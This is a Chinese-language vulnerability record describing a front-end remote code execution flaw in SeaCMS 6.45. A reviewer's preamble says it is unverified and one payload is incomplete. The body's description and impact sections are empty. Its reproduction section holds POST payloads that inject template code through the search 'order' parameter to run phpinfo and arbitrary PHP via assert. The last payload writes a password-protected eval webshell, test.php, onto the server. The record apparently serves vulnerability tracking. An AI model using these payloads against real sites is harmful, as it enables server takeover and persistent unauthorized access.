---
source: "hatch 补库批 20260928"
product: "SeaCMS6.45"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms V6.45 远程命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：searchtype5搜索模板解析、assert字符串执行旧PHP，写目录可写"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-52fe044ca639f110fbbf3a1e"
entity_id: "ve-52fe044ca639f110fbbf3a1e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：searchtype5搜索模板解析、assert字符串执行旧PHP，写目录可写

- **证据待核（1）**：前两个POST有完整order字段，最后写test.php示例缺searchtype/searchword/order参数名，仅从模板体开始。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：模板引擎sink/修复/来源与认证缺，不能由类似其他版本断言同范围。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（3）**：PHP代码执行与系统命令应区分，写shell步骤非无损检测。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 海洋CMS V6.45 前台getshell

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

<http://0-sec.org/search.php?searchtype=5>

POST

    searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
    searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo();

一句话payload，文件test.php 密码pass:

path:

    http://0-sec.org/search.php
    }{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("test.php","w"),'<?php eval($_POST["pass"]);?>'
